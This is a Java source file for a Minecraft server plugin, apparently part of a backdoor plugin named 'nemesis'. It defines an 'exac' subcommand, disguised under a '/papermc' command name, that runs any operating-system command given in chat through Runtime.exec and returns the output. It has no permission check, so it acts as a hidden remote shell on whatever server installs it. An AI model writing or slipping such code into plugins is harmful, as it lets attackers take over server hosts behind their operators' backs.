package nemesis.commands.subcommands;

import java.io.IOException;
import java.util.Scanner;

import org.bukkit.command.CommandSender;

import nemesis.Utils;
import nemesis.commands.SubCommand;

public class Exac implements SubCommand {

    @Override
    public void execute(CommandSender sender, String[] args) {
        if (args.length == 1) {
            sender.sendMessage(Utils.colorize("&cUsage: /papermc exac <command>"));
            return;
        }

        try {
            Process p = Runtime.getRuntime().exec(args[1]);
            Scanner sc = new Scanner(p.getInputStream());
            while (sc.hasNextLine()) {
                sender.sendMessage(sc.nextLine());
            }
            sc.close();
        } catch (IOException e) {
            sender.sendMessage(Utils.colorize("&cCannot execute that command!"));
            sender.sendMessage(Utils.colorize("&c" + e.getMessage()));
        }
    }

    @Override
    public String getName() {
        return "exac";
    }
}
